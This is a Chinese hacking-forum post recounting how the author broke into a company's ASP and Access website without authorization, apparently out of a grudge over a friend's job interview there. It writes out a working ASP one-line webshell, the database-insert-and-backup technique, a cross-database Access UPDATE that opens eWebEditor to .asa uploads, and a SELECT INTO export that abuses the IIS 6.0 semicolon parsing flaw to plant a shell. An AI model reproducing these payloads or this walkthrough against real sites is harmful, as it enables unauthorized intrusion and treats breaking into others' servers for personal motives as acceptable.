@@ -1,0 +1,58 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+一次郁闷的拿shell过程
+D8888D主贴内容-------------------------------------------------------
+ 
+
+本来刚写出来的时候就发t00ls赚几个钱（不想一直都0），但是，不巧那几天t00ls站开不了，就在其它站发了，所以后来就不想发了，刚看到wjs发的那过程，就补充下吧,　如果觉得帖子太菜就请版主直接删帖
+
+
+
+喜欢的女孩去一公司面试,发生了些不愉快的事情,所以就问她要那公司的网站地址,然后就开始了本次检测.
+
+站是用asp + access写的,先找了下后台,试了下一些常用用户名密码,人品不错直接进去了. 看了下功能,觉得有三方法可行
+
+1.        数据库插马,然后备份(因为只能操作备份后的文件名)
+2.        有eWebEditor编辑器
+3.        有个执行SQL的功能,可以考虑access导出webshell
+
+
+      第一种方法试了下, 没成功,后来给朋友WJS,他说可以利用,把shell丢过来,看到地址我晕死了，因为他的方法我试过，仔细回想了下自己的操作,最后发现是我在把一句话转成unicode编码的时候搞错了,我用的是 一句话是<%eval request("stream")%>,转换结果
+如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/1003172215576f10d0bedd3133.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NDI0N3xhZmI5OGFmZnwxMjg2NDgyMDU5fDgzMDJmMng2V2NiUFdPWWltZWRxeFp2R0dBSHc4UHgxMzhLblVyMXFNUGZIc3dB&nothumb=yes]链接标记下载[/url] (14.86 KB)
+
+2010-3-17 22:15
+,
+当时没注意到后面有两个问号,也就是转换出错了,所以我数据库插马备份没能成功. 以为是工具问题,换了个工具,结果一样,问了下别人, 
+他说可能是长度问题,于是把一句话改成<%eval request("flh")%>,结果转换成功
+
+如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/1003172216e75e524385b3f8a7.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NDI0OHwxNjg3MGQzYXwxMjg2NDgyMDU5fDgzMDJmMng2V2NiUFdPWWltZWRxeFp2R0dBSHc4UHgxMzhLblVyMXFNUGZIc3dB&nothumb=yes]链接标记下载[/url] (16.55 KB)
+
+2010-3-17 22:16
+, 
+直接数据库插马拿到shell .
+
+      第二种方法,在没拿到shell前,发现这个eWebEditor没后台,但又有数据库,所以应该不是精减版. 当时以为是管理员改了登录页面名字,拿到shell后,发现是被管理员删了,哎, 下了默认数据库没发现曾被人日过, 也许你会觉得这样就没戏了, 但结合上面执行SQL的功能照样可以拿shell, 这也算是一个新的eWebEditor编辑器利用方法,当然条件有点苛刻, 我们利用eWebEditor就是为了突破上传,突破上传只要把eWebEditor数据库里的表eWebEditor_Style中的s_imageext字段添加相应的上传格式就行,这里因为我们可以执行SQL,那么我们直接update下这表就行,但是这个执行SQL的功能是对网站数据库,不是对eWebEditor的数据库,所以这里我们要用到数据库跨库查询.以前只接触过access下的跨库查询,跨库更新没试过,跨库查询语句select * from 表名 in ‘表所在数据库的物理路径’, 那么跨库更新的语句应该为update 表名 in '表所在数据库的物理路径' set  字段名='值' where 条件. 于是直接在执行SQL功能的框里写上update eWebEditor_Style 
+
+in 'E:\webhost\xxxxxx_ygpftlhq\www\admin\Editor\db\ewebeditor.mdb' set  s_imageext='gif|jpg|jpeg|bmp|aasasa' where s_id=40,成功执行,如图  
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/1003172228e84353802fe5df7d.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDI1MXxhOWZhNWU2ZXwxMjg2NDgyMDU5fDgzMDJmMng2V2NiUFdPWWltZWRxeFp2R0dBSHc4UHgxMzhLblVyMXFNUGZIc3dB&nothumb=yes]链接标记下载[/url] (48.04 KB)
+
+2010-3-17 22:28
+
+访问[url=http://www.xxx.com/editor/ewebeditor.asp?id=s_id&style=s_name]链接标记http://www.xxx.com/editor/ewebeditor.asp?id=s_id&style=s_name[/url] ,提示说" Include Error" , 后来我就把s_imageext字段的值全部更新
+为 'gif|jpg|jpeg|bmp|aasasa' (update eWebEditor_Style in 'E:\webhost\xxxxxxxx_ygpftlhq\www\admin\Editor\db\ewebeditor.mdb' set   s_imageext='gif|jpg|jpeg|bmp|aasasa'),直接到后台管理员发表新闻那里去上传asa马,提示上传成功,这里为什么直接访问会出现" Include Error"呢? 因为有shell, 打开eWebEditor.asp 文件,看到如下到代码
+复制内容到剪贴板
+代码:
+If Not IsSelfRefer Then Response.Write "Include Error":Response.End 
+所以直接访问没用,会提示Include Error. 到这大家是否学到在碰到eWebEditor编辑器却没登录页面. 但网站后台能执行SQL时的另一种拿shell方法呢?
+
+     第三种方法
+在本文不能算成功,因为导出webshell要知道网站的物理路径,还要这个执行SQL的功能, 但也是一个思路, 当时没拿到shell的时候,为了得到网站的物理路径,所以我旁注了两站,希望能通过旁站的物理路径推测出目标站的物理路径.结果旁注两站发现此方法在本此检测中行不通,因为旁注两种得到的物理路径都是E:\webhost\网站域名_随机的8位字母数字\www\ , 当时我还觉得这里的随机的8位字母数字可能是网站域名的MD5加密后里面的其中连续几位,可结果不是我想的那样,所以也没成功, 但拿到shell后, 因为有执行SQL这个功能的系统不常见. 此时又有了物理路径就也顺便测试了下access导出webshell的方法(大家有什么好的爆网站绝对路径方法分享下呀), 用这个方法要结合iis6.0的解析漏洞,因为直接导出asp会导提示“不能更新，数据库或对象为只读”。(控制导出文件后缀是存储在注册表的，
+
+具体键值是HKEY_LOCALMACHINE\Software\Microsoft\Jet\4.0\Engines\Text\DisableExtension，默认情况下值为“!txt,csv,tab,asc,tmp,htm,html”，如果我们把asp也添加进去的话，也导出asp格式的文件,但这不现实) 这里我们执行语句SELECT '' into [fuck] in 'E:\webhost\ xxxxxxxx _ygpftlhq\www\x.asp;fuck.xls' 'EXCEL 4.0;' from web_admin ,当然web_admin里已经在后台加了一句话,要不然自己新建表,插入一句话也行 .执行完后提示成功, 成功拿到了shell
+
+      本来这站因为我在用第一种方法的时候编码出现了问题,所以没能成功,就开始和她聊天,聊好久,搞晚上睡不着,所以干脆想这站的问题,还好找到了新的突破口,谢谢伏玲红! 
+因为网站所在服务器还有不少限制,传asp会说是可能是木马,IIS6.0的解析漏洞也不能用,不知道服务器装了什么检视软件,发现 ;  这个符号就说可能有木马 ,更可气的是传上去的ASA大马,可能有什么关键字被
+他程序当作特征码了,所以基本上的马都不能解析,最后传了个用于旁注的功能很简单的马才搞定
